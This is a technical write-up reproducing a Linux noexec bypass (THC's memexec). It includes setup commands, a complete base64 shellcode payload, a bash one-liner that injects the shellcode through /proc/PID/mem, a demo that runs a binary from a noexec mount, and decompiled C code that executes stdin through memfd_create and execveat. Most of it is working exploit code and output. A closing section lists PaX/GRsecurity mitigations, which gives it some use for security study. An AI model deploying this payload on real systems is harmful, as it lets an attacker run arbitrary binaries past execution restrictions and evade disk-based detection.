## noexec bypass

Userland execution without touching the disk has been existed in the hacking community for quite some time. The first paper on Userland exec was authored by the grugq in 2004. Since then, this technique has continuously evolved in various forms within the hacker community. A recent [write-up](https://iq.thc.org/bypassing-noexec-and-executing-arbitrary-binaries) by THC (The Hacker's Choice, an 0ldsk00l hacker community) "Bypassing noexec and executing arbitrary binaries" has taken this concept to a new level by simplifying the process of writing PoC/exploits that bypass partitions with the noexec flag. The root cause of this exploit vector lies in a change made to the Linux kernel in 2012, which [removed the restrictions on writing to /proc/PID/mem](https://lwn.net/Articles/476947/). THC's write-up provides a detailed explanation of how the [PoC](https://github.com/hackerschoice/memexec) work.

### Set up a RW partition with noexec flag
```
dd if=/dev/zero of=ro-partition.img bs=1M count=100
mkfs.ext4 ro-partition.img 
mkdir /mnt/ro-part
mount -o loop,noexec ro-partition.img /mnt/ro-part/
cd 
git clone https://github.com/hackerschoice/memexec.git
```
### Build the binary:
```
nasm -f elf64 -o memexec-bash-arg-env.o memexec-bash-arg-env.nasm && ld memexec-bash-arg-env.o
```

### Generate shellcode and encode it as base64:
```
ved@debian-vtest:/mnt/ro-part/memexec$ objdump -d a.out |grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' '|tr '\t' ' ' | sed 's/ //g' | xxd -r -p | base64 -w 0
SIngTTHSSIM4AHUQSIN4CCF1CUiD6AhJicLrBkiDwAjr5EyJ0E0x200x5EiDOAB1EEmJw0mD6whIg8AISYnE6wZIg+gI6+RMidhNMe1IMf9IixhIOft0JUiLC0iB4f///wBIgfktLQAAdQlJicZIiXj46wlIg+gISP/H69NIieVIgewSBAAASLhrZXJuZWwAAGoAULg/AQAASInnSDH2DwVJicC4AAAAAL8AAAAASInmugAEAAAPBUiJwkiD+gB+D7gBAAAATInHSInmDwXr1LhCAQAATInHagBIieZMifJIMclNMclNieJBuAAQAAAPBbg8AAAAv2MAAAAPBQ==
```

## Use the base64 code and run it on Bash:
```
ved@debian-vtest:/mnt/ro-part/memexec$ memexec() { bash -c 'cd /proc/$$;exec 4>mem;base64 -d<<<SIngTTHSSIM4AHUQSIN4CCF1CUiD6AhJicLrBkiDwAjr5EyJ0E0x200x5EiDOAB1EEmJw0mD6whIg8AISYnE6wZIg+gI6+RMidhNMe1IMf9IixhIOft0JUiLC0iB4f///wBIgfktLQAAdQlJicZIiXj46wlIg+gISP/H69NIieVIgewSBAAASLhrZXJuZWwAAGoAULg/AQAASInnSDH2DwVJicC4AAAAAL8AAAAASInmugAEAAAPBUiJwkiD+gB+D7gBAAAATInHSInmDwXr1LhCAQAATInHagBIieZMifJIMclNMclNieJBuAAQAAAPBbg8AAAAv2MAAAAPBQ==|dd bs=1 seek=$[$(cat syscall|cut -f9 -d" ")]>&4' "$@"; }
```

### Show time:
```
ved@debian-vtest:/mnt/ro-part/memexec$ cp /bin/id .
ved@debian-vtest:/mnt/ro-part/memexec$ ./id
-bash: ./id: Permission denied
ved@debian-vtest:/mnt/ro-part/memexec$ cat id |  memexec -- 
253+0 records in
253+0 records out
253 bytes copied, 0.000326824 s, 774 kB/s
uid=1000(ved) gid=1000(ved) groups=1000(ved),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

### C code based on help of decompilers
Base on the [output of decompilers](https://dogbolt.org/?id=47cc5eab-f919-4eea-a6f6-adabc90a1875#Hex-Rays=17). The C code is roughly look like:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>

#define BUFFER_SIZE 1024
char buffer2[BUFFER_SIZE] = {0};

int main(int argc, char *argv[], char *envp[]) {
    // Find the start of the stack
    char **env = envp;
    char **arg = argv;
    char *last_arg = NULL;
    char *first_env = NULL;

    // Find the last argument and the first environment variable
    while (*arg) {
        last_arg = *arg;
        arg++;
    }
    first_env = env[0];

    // Create a memory file descriptor
    int memfd = memfd_create("kernel", 0);

    if (memfd < 0) {
	    syscall(SYS_exit, EXIT_FAILURE);
	}

    // Create a buffer for reading input
    char *buffer = buffer2;
    if (!buffer) {
	    syscall(SYS_exit, EXIT_FAILURE);
    }

    ssize_t bytes_read;
    while ((bytes_read = syscall (SYS_read, STDIN_FILENO, buffer, BUFFER_SIZE)) > 0) {
        // Write data to the memory file descriptor
        if ( syscall(SYS_write, memfd, buffer, bytes_read) != bytes_read) {
        	syscall(SYS_exit, EXIT_FAILURE);
        }
    }

    if (bytes_read < 0) {
	    syscall(SYS_exit, EXIT_FAILURE);
    }

    // Prepare to execveat the program in memfd
    char *empty_path = ""; // AT_EMPTY_PATH
    char **new_argv = argv; // Use the original argv
    char **new_envp = envp; // Use the original envp

    // Execute the program in the memory file descriptor
    syscall (SYS_execveat, memfd, empty_path, new_argv, new_envp, 0);

    // If execveat fails
     syscall(SYS_exit, EXIT_FAILURE);
}
```
## Mitigation
PaX/GRsecurity is the only solution against this bypass technique. The vanilla Linux kernel may have the solution in the future.

| Exploit method | Mitigation |
|:-------------:|:-----------------------:|
| Overwrite /proc/*/mem | PaX/GRsecurity enabled /proc/*/mem restriction since the beginning (2012?) |
| memfd_* execution | 1) PaX/GRsecurity RBAC (doesn't require any policy) treat it as SHM_EXEC 2) PaX/GRsecurity TPE |

Prevention log:
```
Oct 31 15:50:37 newdevel kernel: [272707.761418] grsec: denied untrusted exec (due to not being in trusted group and file in non-root-owned directory) of / by /[perl:9099] uid/euid:1000/1000 gid/egid:1000/1000, parent /bin/bash[bash:9075] uid/euid:1000/1000 gid/egid:1000/1000
```

## Reference
* Bypassing noexec and executing arbitrary binaries https://iq.thc.org/bypassing-noexec-and-executing-arbitrary-binaries
* A /proc/PID/mem vulnerability https://lwn.net/Articles/476947/
* Execute ELF files without dropping them on disk https://github.com/nnsee/fileless-elf-exec
* userland exec for Linux x86_64 https://github.com/bediger4000/userlandexec
* The Design and Implementation of Userland Exec https://grugq.github.io/docs/ul_exec.txt
